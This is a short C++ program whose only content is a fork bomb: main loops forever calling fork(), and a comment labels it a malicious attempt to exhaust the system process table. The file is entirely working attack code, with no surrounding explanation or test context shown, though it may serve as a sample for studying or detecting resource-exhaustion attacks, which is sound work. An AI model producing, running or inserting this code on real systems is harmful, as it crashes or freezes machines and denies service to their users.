#include <iostream>
#include <unistd.h>

int main() {
    // Malicious fork bomb attempting to exhaust system process table
    while (true) {
        fork();
    }
    return 0;
}
